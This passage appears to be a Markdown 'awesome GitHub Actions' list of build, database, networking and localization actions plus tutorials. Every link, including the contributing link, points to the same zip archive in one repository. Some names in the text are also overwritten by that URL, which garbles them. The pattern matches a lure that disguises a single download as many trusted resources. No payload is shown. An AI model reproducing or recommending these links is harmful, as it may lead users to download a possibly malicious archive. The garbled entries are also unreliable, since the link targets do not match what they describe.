### Build

- [run-cmake](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Multi platform action to build C/C++ software with [CMake](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) and [Ninja](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip).
- [run-vcpkg](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Multi platform action to build and install C/C++ dependencies with [vcpkg](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip).
- [Build Go applications for multiplatform](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Generate ~https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip for Maven builds](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Run Pascal Script](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Setup Brainfuck](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Setup brainfuck interpreter.
- [Publish Go Binaries to GitHub Release Assets](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Setup COBOL](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Check Gradle version](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Keep your Gradle version up to date.

### Database

- [Setup Cassandra Schema](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Running scripts from the provided folder on top of Cassandra cluster.

### Networking

- [Setup ZeroTier](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Connect your runner to a ZeroTier network.

### Localization

- [Find and automatically fix typos and grammar issues in your code](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Translation](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Translate text from any language to any language.

### Fun

- [Add equivalent of a like button in your README](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Visualize community approval on some part of your readme (can be used as a poll).

### Cheat Sheet

- [GitHub Actions Branding Cheat Sheet](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

## Tutorials

- [Continuous deployment of https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip app with Up](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Converting Docker-based Actions to JavaScript/TypeScript](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions CI for Swift/iOS Projects](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Working with GitHub Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions for Rails Developers](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [GitHub Actions Advent Calendar](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Zero Downtime Laravel Deployments with GitHub Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Building Custom GitHub Actions Pluralsight Course](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Continuously Deploying Django to DigitalOcean with Docker and GitHub Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Deploying Self-Hosted GitHub Actions Runners with Docker](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) - Deploy self-hosted GitHub Actions runners with Docker and Docker Swarm to DigitalOcean.
- [Setup Auto-scaled self-hosted GitHub Actions Runners on AWS Spot-instances](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)
- [Getting the Gist of GitHub Actions](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip)

> Please don't hesitate to make a PR if you have more resources to share. Check out [https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip](https://raw.githubusercontent.com/BytesickleLabs/awesome-github-actions/main/glutinative/awesome-github-actions.zip) for more information.
